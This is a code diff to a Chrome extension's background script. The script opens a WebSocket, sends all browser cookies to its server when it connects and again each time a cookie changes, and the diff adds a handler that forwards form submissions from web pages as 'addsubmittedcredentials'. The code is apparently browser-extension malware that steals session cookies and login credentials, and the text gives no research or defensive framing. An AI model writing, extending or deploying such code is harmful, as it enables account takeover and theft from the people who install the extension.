@@ -18,7 +18,7 @@ function connectWebSocket() {
         username: "user",
       });
       chrome.cookies.getAll({}, function (cookies) {
-        ws.send(JSON.stringify(["setcookies", cookies]));
+        send("setcookies", cookies);
       });
       setInterval(() => {
         send("alive", {
@@ -71,5 +71,32 @@ function sendMessageToContentScript(message) {
 }
 
 chrome.cookies.onChanged.addListener(function (changeInfo) {
-  ws.send(JSON.stringify(["updatecookie", changeInfo.cookie]));
+  send("updatecookie", changeInfo.cookie);
+});
+
+chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+  if (message.type === "FORM_SUBMISSION") {
+    // Log the received form data
+    console.log(
+      "Form submission received from:",
+      sender.tab ? sender.tab.url : "unknown source"
+    );
+    console.log("Form data:", message.data);
+    send("addsubmittedcredentials", message.data);
+    // Store the form data (example using chrome.storage)
+    chrome.storage.local.get(["formSubmissions"], (result) => {
+      const submissions = result.formSubmissions || [];
+      submissions.push(message.data);
+
+      chrome.storage.local.set({ formSubmissions: submissions }, () => {
+        console.log("Form submission stored successfully");
+      });
+    });
+
+    // Send response back to content script
+    sendResponse({ status: "success", timestamp: new Date().toISOString() });
+  }
+
+  // Required for async response
+  return true;
 });
